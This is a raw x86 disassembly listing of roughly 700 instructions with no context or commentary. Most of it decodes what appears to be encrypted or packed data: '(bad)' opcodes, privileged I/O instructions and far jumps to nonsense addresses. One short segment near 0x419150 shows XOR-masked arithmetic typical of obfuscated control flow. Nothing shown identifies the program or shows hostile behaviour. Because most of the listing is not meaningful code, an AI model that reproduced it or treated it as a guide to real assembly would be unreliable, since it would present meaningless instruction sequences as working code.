  418b5c:	push   esi
  418b5d:	addr16 loopne 0x418b58
  418b60:	fdivr  st(1),st
  418b62:	jmp    0xa70b:0xb3203ccd
  418b69:	je     0x418bba
  418b6b:	loop   0x418b31
  418b6d:	cmp    edi,DWORD PTR [eax+eax*1+0x33]
  418b71:	call   0x96b4b8a9
  418b76:	fs cwde 
  418b78:	cmp    eax,0x2b568eeb
  418b7d:	pop    esp
  418b7e:	data16 in al,0xed
  418b81:	icebp  
  418b82:	adc    ebp,DWORD PTR [edi+edx*4]
  418b85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b86:	pop    ds
  418b87:	mov    dh,0xd9
  418b89:	pop    ss
  418b8a:	or     edx,DWORD PTR [ebp-0x4f1af196]
  418b90:	loopne 0x418bc6
  418b92:	pop    ebx
  418b93:	and    dh,bl
  418b95:	inc    bx
  418b97:	adc    BYTE PTR [ecx],bl
  418b99:	mov    edx,0x9066cade
  418b9e:	ins    BYTE PTR es:[edi],dx
  418b9f:	outs   dx,BYTE PTR ds:[esi]
  418ba0:	les    ebx,FWORD PTR ds:0x322bcb0b
  418ba6:	cmp    BYTE PTR [eax-0x3f012d84],bh
  418bac:	(bad)  
  418bae:	sub    eax,0x23450979
  418bb3:	pop    ebx
  418bb4:	aaa    
  418bb5:	push   eax
  418bb6:	cmp    eax,0xfc4282da
  418bbb:	pop    ds
  418bbc:	mov    dl,0x72
  418bbe:	add    esi,edx
  418bc0:	clc    
  418bc1:	or     dl,bl
  418bc3:	(bad)  
  418bc4:	ror    esp,1
  418bc6:	dec    edi
  418bc7:	sti    
  418bc8:	or     al,BYTE PTR [edx]
  418bca:	shl    BYTE PTR [ebx],cl
  418bcc:	or     edi,DWORD PTR [esi+0x27]
  418bcf:	xchg   esi,eax
  418bd0:	mov    eax,ds:0xddaa0beb
  418bd5:	out    0x2e,al
  418bd7:	mov    ds:0x8496f126,eax
  418bdc:	add    ebx,DWORD PTR [eax+ebp*2]
  418bdf:	mov    WORD PTR [edi],cs
  418be1:	mov    ebp,gs
  418be3:	(bad)  
  418be4:	mov    edx,0xf38e96df
  418be9:	mov    DWORD PTR [ebx+ecx*2-0x79],ebp
  418bed:	rcr    DWORD PTR es:[ebx+0x24],0xab
  418bf2:	test   eax,0xba9cc14a
  418bf7:	test   eax,0xbb91aa28
  418bfc:	daa    
  418bfd:	xchg   esp,eax
  418bfe:	(bad)  [edx-0x37]
  418c01:	retf   0x3fd6
  418c04:	mov    ds:0x9a02c701,eax
  418c09:	out    0x7f,eax
  418c0b:	aad    0x72
  418c0d:	inc    edi
  418c0e:	mov    al,ds:0x8ddea3ac
  418c13:	test   BYTE PTR [eax],al
  418c15:	mov    DWORD PTR [ebx-0x80],edx
  418c18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c19:	fist   DWORD PTR [esi+0xbef9407]
  418c1f:	pop    esi
  418c20:	xor    al,0xce
  418c22:	(bad)  
  418c23:	out    0xd7,al
  418c25:	inc    esi
  418c26:	jb     0x418c6b
  418c28:	bound  eax,QWORD PTR [ecx+0x559cb6af]
  418c2e:	(bad)  
  418c2f:	cmp    BYTE PTR [ebp-0x3c],ch
  418c32:	outs   dx,BYTE PTR ds:[esi]
  418c33:	(bad)  
  418c34:	daa    
  418c35:	push   esi
  418c36:	and    edi,ebx
  418c38:	out    0x3,al
  418c3a:	ss add al,0x26
  418c3d:	pop    ds
  418c3e:	inc    ebp
  418c3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c40:	or     al,dh
  418c42:	xchg   edi,eax
  418c43:	inc    edi
  418c44:	(bad)  
  418c45:	das    
  418c46:	pop    eax
  418c47:	aas    
  418c48:	nop
  418c49:	inc    edi
  418c4a:	in     al,0xcf
  418c4c:	fbstp  TBYTE PTR [edx+0x10bd15bf]
  418c52:	xor    BYTE PTR [eax],dh
  418c54:	arpl   WORD PTR [edx],di
  418c56:	sub    al,0xaf
  418c58:	sub    BYTE PTR [edx],0xad
  418c5b:	inc    edi
  418c5c:	std    
  418c5d:	adc    DWORD PTR [ecx-0x35],edx
  418c60:	(bad)  
  418c61:	push   esi
  418c62:	test   BYTE PTR [ebx+0x71],ah
  418c65:	pop    edi
  418c66:	pusha  
  418c67:	repnz enter 0x66f1,0x44
  418c6c:	mov    ebp,0x5ed561fc
  418c71:	inc    ecx
  418c72:	aas    
  418c73:	clc    
  418c74:	lds    eax,FWORD PTR [edx-0x7380e7c9]
  418c7a:	dec    esi
  418c7b:	lock not BYTE PTR [ecx-0x19b82b19]
  418c82:	pop    es
  418c83:	das    
  418c84:	cld    
  418c85:	rol    BYTE PTR [eax],1
  418c87:	inc    esi
  418c88:	or     bl,cl
  418c8a:	fstp   TBYTE PTR [edx-0x7bb66313]
  418c90:	ret    
  418c91:	scas   eax,DWORD PTR es:[edi]
  418c92:	push   ebp
  418c93:	mov    ch,0xf
  418c95:	or     edx,DWORD PTR [edi]
  418c97:	fild   QWORD PTR [edx]
  418c99:	mov    bl,0x80
  418c9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c9c:	dec    ecx
  418c9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c9e:	data16 ss add al,0x64
  418ca2:	outs   dx,DWORD PTR ds:[esi]
  418ca3:	jmp    0x75ec:0x7c2cb60b
  418caa:	rcl    DWORD PTR [esi+0x21c52d9c],0xa9
  418cb1:	jno    0x418d2e
  418cb3:	popf   
  418cb4:	outs   dx,DWORD PTR ds:[esi]
  418cb5:	inc    di
  418cb7:	xor    BYTE PTR [eax],ah
  418cb9:	pop    ecx
  418cba:	cmp    eax,0x6341b017
  418cbf:	daa    
  418cc0:	mov    dh,0xad
  418cc2:	or     dh,al
  418cc4:	daa    
  418cc5:	sub    eax,0x864e93d
  418cca:	cmp    bl,cl
  418ccc:	lods   eax,DWORD PTR ds:[esi]
  418ccd:	jmp    0x418c93
  418ccf:	jae    0x418cb7
  418cd1:	add    al,0xe4
  418cd3:	xchg   edx,eax
  418cd4:	rcr    DWORD PTR [edi+0x1e],1
  418cd7:	lahf   
  418cd8:	jnp    0x418d37
  418cda:	push   edi
  418cdb:	mov    ebp,0x9ce59563
  418ce0:	lock sti 
  418ce2:	or     eax,0x8e43fa3d
  418ce7:	or     ch,BYTE PTR [esi]
  418ce9:	add    bh,BYTE PTR [esi-0x4fef69c4]
  418cef:	les    ebx,FWORD PTR [ebx-0x5a]
  418cf2:	push   edi
  418cf3:	aaa    
  418cf4:	and    cl,ch
  418cf6:	adc    DWORD PTR [ebp-0xf4a9b0e],ebp
  418cfc:	sbb    al,0x56
  418cfe:	(bad)  
  418cff:	mov    esp,0x47d605bb
  418d04:	xchg   BYTE PTR ds:0xd631bdf5,al
  418d0a:	mov    DWORD PTR [edx+0xc],eax
  418d0d:	rol    BYTE PTR ds:0x389df0f,1
  418d13:	nop
  418d14:	or     dh,bl
  418d16:	fbld   TBYTE PTR ds:0xae296dcc
  418d1c:	adc    eax,0xe2810789
  418d21:	xor    eax,0x293631d4
  418d26:	leave  
  418d27:	stc    
  418d28:	js     0x418d0e
  418d2a:	sub    edi,esi
  418d2c:	sub    eax,0xceb8281a
  418d31:	imul   ebx,DWORD PTR [ebp+0x3124d7f0],0x6a15789f
  418d3b:	test   eax,0x46b37baa
  418d40:	enter  0x8e9a,0xdb
  418d44:	(bad)  
  418d46:	add    BYTE PTR [esi],cl
  418d48:	bound  esp,QWORD PTR [eax]
  418d4a:	das    
  418d4b:	push   cs
  418d4c:	xor    dh,dl
  418d4e:	sti    
  418d4f:	pop    edi
  418d50:	push   esp
  418d51:	outs   dx,BYTE PTR ds:[esi]
  418d52:	loope  0x418d98
  418d54:	mov    ah,0x5a
  418d56:	push   0xf680a799
  418d5b:	mov    ch,BYTE PTR [ecx-0x77643ed]
  418d61:	cld    
  418d62:	mov    dh,0xd4
  418d64:	mov    al,0x8b
  418d66:	inc    ebx
  418d67:	xor    DWORD PTR [edi-0x51af2677],eax
  418d6d:	das    
  418d6e:	mov    eax,ds:0x2155fd82
  418d73:	in     eax,0xf1
  418d75:	mov    edx,0x1a992c8e
  418d7a:	adc    al,BYTE PTR [eax-0x1d]
  418d7d:	cs sbb al,0x4e
  418d80:	jmp    0x46ffc680
  418d85:	jbe    0x418d76
  418d87:	xchg   ebp,eax
  418d88:	icebp  
  418d89:	mov    bh,BYTE PTR [ecx+0x10e6ee64]
  418d8f:	dec    ebx
  418d90:	sbb    DWORD PTR [ecx+eiz*8],ebx
  418d93:	leave  
  418d94:	lock pminub mm2,QWORD PTR [edi-0x7bc4d6ba]
  418d9c:	cmc    
  418d9d:	lods   eax,DWORD PTR ds:[esi]
  418d9e:	in     al,0x43
  418da0:	xor    BYTE PTR [ebp+0x7ca39c6a],cl
  418da6:	mov    eax,0x6d7fcb2e
  418dab:	shl    BYTE PTR [ecx],1
  418dad:	fisub  DWORD PTR [edi+ebp*4]
  418db0:	jmp    0x37f6ebe1
  418db5:	add    dl,BYTE PTR [ebp+0x2ff29233]
  418dbb:	inc    edi
  418dbc:	cmp    cl,BYTE PTR [ecx-0xd]
  418dbf:	pop    edx
  418dc0:	mov    DWORD PTR [eax+0x1],edi
  418dc3:	dec    esp
  418dc4:	cmp    BYTE PTR [esi+0x34],dl
  418dc7:	sbb    al,BYTE PTR [ecx-0x62c7e92a]
  418dcd:	cld    
  418dce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418dcf:	xor    esp,edx
  418dd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418dd2:	aaa    
  418dd3:	inc    ecx
  418dd4:	xchg   edi,eax
  418dd5:	xchg   ebp,eax
  418dd6:	or     DWORD PTR [ebx-0x20],0x56
  418dda:	mov    ecx,0x1af515ac
  418ddf:	leave  
  418de0:	push   eax
  418de1:	imul   esp,DWORD PTR [ebx-0x206be260],0xffffffa2
  418de8:	or     DWORD PTR [ecx],ebp
  418dea:	jo     0x418e38
  418dec:	loope  0x418dab
  418dee:	xchg   ecx,eax
  418def:	adc    BYTE PTR ds:0x26dcfda7,cl
  418df5:	ret    
  418df6:	mov    al,fs:0xa1b159cb
  418dfc:	ret    
  418dfd:	inc    eax
  418dfe:	push   eax
  418dff:	or     eax,0xb18b9799
  418e04:	(bad)  
  418e05:	mov    BYTE PTR ss:[eax+eax*2],bh
  418e09:	lds    ebx,FWORD PTR [ebp-0x39a2bd76]
  418e0f:	pop    esp
  418e10:	(bad)  
  418e11:	dec    esp
  418e12:	mov    al,ds:0x417852ba
  418e17:	cwde   
  418e18:	mov    esi,0xf850c75d
  418e1d:	(bad)  
  418e1e:	mov    dh,0x40
  418e20:	and    al,0x7b
  418e22:	mov    ebp,0x257c3f96
  418e27:	jp     0x418e96
  418e29:	mov    dh,0x22
  418e2b:	lock push esp
  418e2d:	jno    0x418de5
  418e2f:	jge    0x418db8
  418e31:	(bad)  
  418e32:	or     ah,BYTE PTR [edx]
  418e34:	shr    BYTE PTR ds:0x9c48d04b,0xae
  418e3b:	imul   esi,DWORD PTR [eax-0x6e],0x2306a40e
  418e42:	add    bl,bl
  418e44:	daa    
  418e45:	xchg   esi,eax
  418e46:	pop    es
  418e47:	dec    edi
  418e48:	cwde   
  418e49:	sar    BYTE PTR [edi+0x7],0x3b
  418e4d:	hlt    
  418e4e:	push   edx
  418e4f:	inc    ebx
  418e50:	xor    dh,BYTE PTR [eax-0x1ff1475c]
  418e56:	loope  0x418eb1
  418e58:	push   cs
  418e59:	aas    
  418e5a:	enter  0xb73a,0xe7
  418e5e:	pop    ecx
  418e5f:	or     bh,BYTE PTR [edx+0x27]
  418e62:	xor    DWORD PTR [edx+0x5b5621fd],esi
  418e68:	clc    
  418e69:	mov    bh,BYTE PTR [esi]
  418e6b:	xchg   ebx,eax
  418e6c:	fmul   QWORD PTR [ecx+0x34]
  418e6f:	xchg   esp,eax
  418e70:	ficomp WORD PTR [edi-0x34]
  418e73:	outs   dx,BYTE PTR ds:[esi]
  418e74:	daa    
  418e75:	mov    bl,0x35
  418e77:	jns    0x418e85
  418e79:	push   ecx
  418e7a:	mov    ebx,0x803ed87e
  418e7f:	inc    eax
  418e80:	add    DWORD PTR [ebx-0x7c384948],ebp
  418e86:	dec    esi
  418e87:	cdq    
  418e88:	and    BYTE PTR [edx+0x69],al
  418e8b:	mov    eax,0x91980630
  418e90:	arpl   dx,si
  418e92:	retf   0x3f83
  418e95:	mov    ebx,0x2a63c353
  418e9a:	jb     0x418efe
  418e9c:	ret    0x545c
  418e9f:	fs inc edx
  418ea1:	test   DWORD PTR [ebp+0x63e3a640],0x3a17a7d3
  418eab:	scas   al,BYTE PTR es:[edi]
  418eac:	aas    
  418ead:	pop    esi
  418eae:	in     eax,dx
  418eaf:	aaa    
  418eb0:	xor    DWORD PTR ds:0xef90b56,edi
  418eb6:	xor    dh,0x48
  418eb9:	dec    esi
  418eba:	dec    esp
  418ebb:	std    
  418ebc:	and    ebx,ecx
  418ebe:	mov    ecx,0x75c9a7f7
  418ec3:	icebp  
  418ec4:	cli    
  418ec5:	mov    esp,0x281db36c
  418eca:	sar    BYTE PTR [edx-0x711680f7],0xf5
  418ed1:	and    DWORD PTR [ebx],eax
  418ed3:	outs   dx,DWORD PTR ds:[esi]
  418ed4:	pushf  
  418ed5:	push   esi
  418ed6:	cmp    DWORD PTR [ebx],esi
  418ed8:	in     al,dx
  418ed9:	push   ecx
  418eda:	and    DWORD PTR [ecx+0x0],ecx
  418edd:	dec    edi
  418ede:	test   DWORD PTR [edx+esi*1+0x16],eax
  418ee2:	push   eax
  418ee3:	sub    al,0xe7
  418ee5:	push   edx
  418ee6:	inc    edx
  418ee7:	xchg   esi,eax
  418ee8:	lods   al,BYTE PTR ds:[esi]
  418ee9:	pop    edx
  418eea:	lea    esi,[ebx-0x31]
  418eed:	jns    0x418f10
  418eef:	or     BYTE PTR [ecx-0x7ec06267],0x9e
  418ef6:	into   
  418ef7:	xor    BYTE PTR [ecx-0x401b4ed9],bl
  418efd:	hlt    
  418efe:	or     eax,0xdb6bc376
  418f03:	dec    ebp
  418f04:	pop    esp
  418f05:	xor    eax,0x6b25f12d
  418f0a:	pop    eax
  418f0b:	adc    dl,bh
  418f0d:	pop    es
  418f0e:	gs sub al,0xd8
  418f11:	jnp    0x418f0f
  418f13:	and    eax,DWORD PTR [ecx+esi*2]
  418f16:	mov    ebp,0x1d1b5c3e
  418f1b:	outs   dx,DWORD PTR ds:[esi]
  418f1c:	popa   
  418f1d:	jg     0x418f9b
  418f1f:	inc    eax
  418f20:	popf   
  418f21:	mov    bh,0x22
  418f23:	pop    esi
  418f24:	outs   dx,DWORD PTR ds:[esi]
  418f25:	pop    ecx
  418f26:	push   es
  418f27:	mov    ebp,0xa6b64477
  418f2c:	es sub eax,0xbb82646f
  418f32:	push   esp
  418f33:	xor    eax,0x3fba0290
  418f38:	xchg   esp,eax
  418f39:	mov    esi,0xa7763bbe
  418f3e:	sub    bh,BYTE PTR [edx+ecx*2-0x5f6cf4d1]
  418f45:	scas   eax,DWORD PTR es:[edi]
  418f46:	enter  0x3748,0x60
  418f4a:	jle    0x418ee5
  418f4c:	mov    ch,0xbf
  418f4e:	mov    cl,ch
  418f50:	loopne 0x418f31
  418f52:	(bad)  
  418f53:	in     al,0x19
  418f55:	in     al,0x98
  418f57:	imul   esi,DWORD PTR [ebx],0x197740fd
  418f5d:	mov    al,0x31
  418f5f:	jl     0x418f55
  418f61:	rcr    ch,1
  418f63:	jl     0x418f9d
  418f65:	sahf   
  418f66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f67:	inc    edx
  418f68:	mov    ds:0x55677177,al
  418f6d:	xor    edx,DWORD PTR [edx+ebp*2+0x30]
  418f71:	xor    al,0xee
  418f73:	or     eax,0x7babbe9
  418f78:	mov    al,ds:0xaaa91d65
  418f7d:	xor    ecx,edi
  418f7f:	mov    dh,BYTE PTR [edx+0x62]
  418f82:	mov    al,ds:0xcb639f4c
  418f87:	jbe    0x418f54
  418f89:	popa   
  418f8a:	aas    
  418f8b:	mov    al,ds:0x909bf976
  418f90:	enter  0x4cdb,0x1c
  418f94:	add    esp,DWORD PTR [edi+0x3da22a86]
  418f9a:	add    al,0x8
  418f9c:	inc    edx
  418f9d:	retf   
  418f9e:	push   ds
  418f9f:	jmp    FWORD PTR [ebp-0x3a]
  418fa2:	cmp    eax,0x404aa489
  418fa7:	das    
  418fa8:	outs   dx,DWORD PTR ds:[esi]
  418fa9:	outs   dx,DWORD PTR ds:[esi]
  418faa:	adc    bh,bh
  418fac:	cs mov eax,0x5e5756b5
  418fb2:	mov    edi,0xafbedd04
  418fb7:	jns    0x418fc1
  418fb9:	jecxz  0x41901d
  418fbb:	int3   
  418fbc:	mov    DWORD PTR [eax+0x1f],esi
  418fbf:	push   ebp
  418fc0:	mov    eax,ds:0x18df0f68
  418fc5:	mov    ds:0x74603c50,eax
  418fca:	mov    ch,0x78
  418fcc:	xchg   BYTE PTR [eax+0x39aa54c1],dh
  418fd2:	add    al,0x88
  418fd4:	and    eax,0xf78bd479
  418fd9:	dec    esp
  418fda:	mov    al,0x53
  418fdc:	jge    0x418fc2
  418fde:	ds adc eax,0x42815a43
  418fe4:	mov    WORD PTR [ebp-0x691ddc5e],?
  418fea:	jmp    0xf61e5c9c
  418fef:	repnz mov ecx,0x76253d1e
  418ff5:	rol    BYTE PTR [edi+0x38],cl
  418ff8:	test   BYTE PTR es:[edi+ecx*2-0x472d5290],dh
  419000:	jg     0x418ff8
  419002:	inc    esp
  419003:	in     al,dx
  419004:	and    eax,0xf059a78f
  419009:	icebp  
  41900a:	test   eax,0x7febfc99
  41900f:	mov    eax,ds:0x2f2e48f2
  419014:	xor    eax,0xaa04cca4
  419019:	stos   BYTE PTR es:[edi],al
  41901a:	imul   edi,DWORD PTR [edx-0x3ba41a58],0x10038cee
  419024:	loope  0x418fb4
  419026:	adc    eax,DWORD PTR [edx+0x18685cba]
  41902c:	dec    esi
  41902d:	gs int3 
  41902f:	fbld   TBYTE PTR ds:0xc4ab89b9
  419035:	fsubr  QWORD PTR [edi-0x70]
  419038:	mov    ch,0x92
  41903a:	xchg   ebp,eax
  41903b:	into   
  41903c:	push   ebp
  41903d:	cmp    ebx,edx
  41903f:	jmp    0xb4d51398
  419044:	mov    dl,0x9e
  419046:	inc    ebx
  419047:	clc    
  419048:	jg     0x419059
  41904a:	add    edi,ebp
  41904c:	jb     0x41909a
  41904e:	inc    esi
  41904f:	lock mov dl,0xe3
  419052:	mov    ch,dl
  419054:	stos   DWORD PTR es:[edi],eax
  419055:	dec    edi
  419056:	icebp  
  419057:	mov    bh,0xff
  419059:	jnp    0x418ff5
  41905b:	imul   ecx,esp,0xfffffff0
  41905e:	jle    0x418fed
  419060:	inc    ebp
  419061:	jp     0x419053
  419063:	hlt    
  419064:	test   DWORD PTR cs:[edx+0x13],ebx
  419068:	and    ch,BYTE PTR ds:0x2da571cb
  41906f:	adc    al,bh
  419071:	(bad)  
  419072:	cli    
  419073:	cmp    eax,0x64e27577
  419078:	mov    ds:0x1ad4e7f,eax
  41907d:	bound  esi,QWORD PTR [ebp-0x10]
  419080:	mov    ds:0x520421a,al
  419085:	leave  
  419086:	and    BYTE PTR [esi-0xa],0xb1
  41908a:	and    DWORD PTR [ecx],eax
  41908c:	cmp    esp,esi
  41908e:	mov    ah,0xf8
  419090:	pop    esp
  419091:	add    bl,BYTE PTR [esi-0x7a]
  419094:	psrld  mm0,mm0
  419097:	cld    
  419098:	in     al,0x4a
  41909a:	pusha  
  41909b:	out    0x26,eax
  41909d:	lods   al,BYTE PTR es:[esi]
  41909f:	xor    edx,DWORD PTR [eax+0x2c]
  4190a2:	xchg   ebp,eax
  4190a3:	nop
  4190a4:	in     al,dx
  4190a5:	adc    eax,0x115495e2
  4190aa:	mov    bh,0x3c
  4190ac:	cli    
  4190ad:	popf   
  4190ae:	jmp    0x4190ac
  4190b0:	cmp    eax,0x55f6a2cc
  4190b5:	mov    ch,0x12
  4190b7:	loop   0x419113
  4190b9:	popa   
  4190ba:	cmp    ch,BYTE PTR [ebx-0x7955074c]
  4190c0:	jmp    0xa01d4eb9
  4190c5:	push   esi
  4190c6:	into   
  4190c7:	sub    DWORD PTR [edi],edi
  4190c9:	mov    ch,0xd1
  4190cb:	xchg   DWORD PTR [ebx],ecx
  4190cd:	repz es mov esp,0x932117a6
  4190d4:	jmp    0x82ad:0xf7aff4c
  4190db:	jp     0x41914e
  4190dd:	cwde   
  4190de:	rol    DWORD PTR [ecx+eax*4+0x2386a4e9],cl
  4190e5:	sbb    al,0x92
  4190e7:	pop    esp
  4190e8:	jne    0x4190e8
  4190ea:	sbb    esi,DWORD PTR [edi]
  4190ec:	jmp    0x84bfe552
  4190f1:	cdq    
  4190f2:	jmp    0xa98e:0x19e7c646
  4190f9:	xchg   edi,eax
  4190fa:	fwait
  4190fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190fc:	lods   eax,DWORD PTR ds:[esi]
  4190fd:	mov    ds:0x248029b1,eax
  419102:	mov    al,ds:0xcb5d7df6
  419107:	adc    al,0xcf
  419109:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41910a:	scas   al,BYTE PTR es:[edi]
  41910b:	repz call DWORD PTR [edi-0xf47b7c6]
  419112:	sbb    al,0xef
  419114:	dec    eax
  419115:	mov    al,ds:0x6eb5620f
  41911a:	mov    ds:0x7e692e12,al
  41911f:	push   esi
  419120:	pop    edx
  419121:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419122:	out    dx,al
  419123:	(bad)
  419127:	loop   0x41918b
  419129:	iret   
  41912a:	cmp    BYTE PTR [ecx-0x62],cl
  41912d:	push   eax
  41912e:	xlat   BYTE PTR ds:[ebx]
  41912f:	jbe    0x419186
  419131:	lock dec ebx
  419133:	in     al,dx
  419134:	mov    eax,0x8d57e56e
  419139:	dec    ecx
  41913a:	or     al,0x53
  41913c:	cmp    DWORD PTR [ebx-0x4f32cf08],0x8bb05589
  419146:	push   ebp
  419147:	or     BYTE PTR [ebx-0x28fc4ba3],cl
  41914d:	and    edx,ebx
  41914f:	mov    DWORD PTR [ebp-0x4c],edx
  419152:	mov    edx,DWORD PTR [ebp+0x8]
  419155:	mov    ebx,DWORD PTR [ebp-0x48]
  419158:	lea    edx,[ebx+edx*1+0x241fcdf]
  41915f:	mov    DWORD PTR [ebp-0x48],edx
  419162:	mov    edx,DWORD PTR [ebp+0x8]
  419165:	mov    ebx,0xfa5e1524
  41916a:	sub    ebx,edx
  41916c:	add    ebx,DWORD PTR [ebp-0x44]
  41916f:	mov    DWORD PTR [ebp-0x44],ebx
  419172:	mov    edx,DWORD PTR [ebp+0x8]
  419175:	xor    edx,eax
  419177:	add    edx,esi
  419179:	jne    0x416da2
  41917f:	mov    edx,DWORD PTR [ebp-0x8]
  419182:	mov    ebx,DWORD PTR [ebp-0xc]
  419185:	xor    edx,eax
  419187:	lea    edx,[edx+ebx*1+0x3272f5]
  41918e:	mov    DWORD PTR [ebp-0xc],edx
  419191:	mov    edx,DWORD PTR [ebp-0x10]
  419194:	xor    edx,eax
  419196:	add    edx,esi
  419198:	jne    0x4124bd
  41919e:	jmp    0x41b615
  4191a3:	mov    ecx,DWORD PTR [ebp-0x14]
  4191a6:	mov    DWORD PTR [ebp+0x8],ecx
  4191a9:	jmp    0x41b582
  4191ae:	mov    ecx,DWORD PTR [ebp+0x8]
  4191b1:	mov    edx,DWORD PTR [ebp-0x8]
  4191b4:	xor    ecx,eax
  4191b6:	xor    edx,eax
  4191b8:	sub    ecx,edx
  4191ba:	sub    ecx,esi
  4191bc:	xor    ecx,eax
  4191be:	mov    DWORD PTR [ebp+0x8],ecx
  4191c1:	mov    ecx,DWORD PTR [ebp+0x8]
  4191c4:	mov    edx,DWORD PTR [ebp-0x58]
  4191c7:	add    ecx,0x5708e2
  4191cd:	imul   ecx,edx
  4191d0:	mov    DWORD PTR [ebp-0x58],ecx
  4191d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4191d6:	mov    edx,DWORD PTR [ebp-0x54]
  4191d9:	add    ecx,0x64f880
  4191df:	or     ecx,edx
  4191e1:	mov    DWORD PTR [ebp-0x54],ecx
  4191e4:	mov    ecx,DWORD PTR [ebp+0x8]
  4191e7:	mov    edx,DWORD PTR [ebp-0x50]
  4191ea:	add    ecx,0x242ebf1
  4191f0:	xor    ecx,edx
  4191f2:	mov    DWORD PTR [ebp-0x50],ecx
  4191f5:	jmp    0x41b555
  4191fa:	pop    edx
  4191fb:	cmp    al,0xf8
  4191fd:	inc    esp
  4191fe:	xchg   esi,eax
  4191ff:	test   dl,cl
  419201:	and    al,BYTE PTR [edx+0x74f7278c]
  419207:	sub    BYTE PTR [ebx+0x4b],dh
  41920a:	xor    esp,DWORD PTR [eax]
  41920c:	add    BYTE PTR [ebx-0x7c7ca1c2],0xe3
  419213:	adc    cl,al
  419215:	repz lds esp,FWORD PTR [ebp+0x31eef947]
  41921c:	jle    0x41927b
  41921e:	test   ecx,ebp
  419220:	test   al,0x61
  419222:	rcr    esi,1
  419224:	call   0x7fdc:0x6b94edb9
  41922b:	and    BYTE PTR ds:0x429b8349,bh
  419231:	inc    edx
  419232:	imul   DWORD PTR [esi+0xfdb0b42]
  419238:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419239:	adc    dh,BYTE PTR [esi+0x75d145c8]
  41923f:	das    
  419240:	shl    BYTE PTR [eax],0xb6
  419243:	dec    edi
  419244:	dec    ebx
  419245:	(bad)  
  419246:	loop   0x419226
  419248:	push   0xf9d4a175
  41924d:	imul   ebx,DWORD PTR [ebx-0x6740e7de],0x30f8b8de
  419257:	in     al,0x8d
  419259:	push   eax
  41925a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41925b:	(bad)  
  41925c:	adc    DWORD PTR [ebp-0x2e],edi
  41925f:	outs   dx,BYTE PTR ds:[esi]
  419260:	mov    BYTE PTR [ebx],ah
  419262:	fidivr WORD PTR ds:0xcc135aa0
  419268:	or     eax,0x2b3bd0cc
  41926d:	adc    DWORD PTR [esi],ecx
  41926f:	sbb    ch,BYTE PTR [edi]
  419271:	dec    ecx
  419272:	dec    esp
  419273:	jb     0x4192e6
  419275:	mov    eax,esp
  419277:	dec    esi
  419278:	add    DWORD PTR [edi],edi
  41927a:	xchg   esp,eax
  41927b:	(bad)  
  41927d:	fld    st(3)
  41927f:	pop    es
  419280:	jmp    0xf25b:0xfe467e1f
  419287:	mov    WORD PTR [esi+0x2d37bbb8],?
  41928d:	jmp    0x4192bb
  41928f:	or     ecx,ebx
  419291:	das    
  419292:	xor    BYTE PTR [ebp+0x5db6346d],cl
  419298:	push   ebp
  419299:	and    DWORD PTR [ecx+0x4a],ebx
  41929c:	retf   0x3330
  41929f:	imul   esp,esp,0x155a7f5c
  4192a5:	sbb    BYTE PTR [ebp-0x339a5c22],cl
  4192ab:	adc    ah,BYTE PTR [ecx]
  4192ad:	pop    edi
  4192ae:	cs xchg esp,eax
  4192b0:	in     eax,dx
  4192b1:	jg     0x4192aa
  4192b3:	es and eax,0x65e5d20c
  4192b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4192ba:	jmp    0x5320:0xec5e5029
  4192c1:	fidivr DWORD PTR [esp+ebx*1]
  4192c4:	dec    edx
  4192c5:	xlat   BYTE PTR ds:[ebx]
  4192c6:	mov    ebx,0x41b6f339
  4192cb:	jge    0x419313
  4192cd:	jo     0x4192c7
  4192cf:	outs   dx,DWORD PTR ds:[esi]
  4192d0:	rcl    BYTE PTR [ecx],1
  4192d2:	jae    0xab213e28
  4192d8:	mov    edx,0x2afe04d5
  4192dd:	cld    
  4192de:	aad    0xc6
  4192e0:	push   ebx
  4192e1:	push   ebp
  4192e2:	je     0x4192aa
  4192e4:	inc    esi
  4192e5:	shl    BYTE PTR [ecx-0x26ef6ee6],0xe8
  4192ec:	int    0xde
  4192ee:	pop    ecx
  4192ef:	or     DWORD PTR [edi+esi*8+0x38],edx
  4192f3:	je     0x419374
  4192f5:	outs   dx,DWORD PTR ds:[esi]
  4192f6:	or     al,0x3c
  4192f8:	xchg   ecx,eax
  4192f9:	(bad)
  4192fc:	dec    esp
  4192fd:	mov    ebp,0x22124f4d
  419302:	in     eax,0xaf
  419304:	inc    ebx
  419305:	test   BYTE PTR [edi],cl
  419307:	je     0x41937c
  419309:	jnp    0x419326
  41930b:	pop    ebp
  41930c:	xor    ebp,DWORD PTR [eax+esi*8-0x5d]
  419310:	or     ebp,esi
  419312:	mov    dl,0x3e
  419314:	aaa    
  419315:	xor    DWORD PTR ds:0x8b53798c,edi
  41931b:	dec    edx
  41931c:	cmp    BYTE PTR [edi],dl
  41931e:	and    esi,DWORD PTR [ebp-0x45]
  419321:	out    dx,eax
  419322:	je     0x419328
  419324:	jge    0x4192f0
  419326:	sar    ch,cl
  419328:	ror    BYTE PTR [edi+esi*2-0xd2a76b],1
  41932f:	jno    0x4192b4
  419331:	enter  0x7ab9,0x54
  419335:	jne    0x4192f4
  419337:	gs pop ss
  419339:	jnp    0x419380
  41933b:	xchg   edi,eax
  41933c:	xchg   BYTE PTR [eax-0x4d54a74c],dl
  419342:	cld    
  419343:	retf   
  419344:	jp     0x419310
  419346:	adc    bh,BYTE PTR [esi]
  419348:	lods   eax,DWORD PTR ds:[esi]
  419349:	mov    bl,0x4c
  41934b:	adc    al,0xa6
  41934d:	ja     0x4193a5
  41934f:	xchg   edx,eax
  419350:	loope  0x419372
  419352:	jmp    0xb034f41e
  419357:	dec    esp
  419358:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
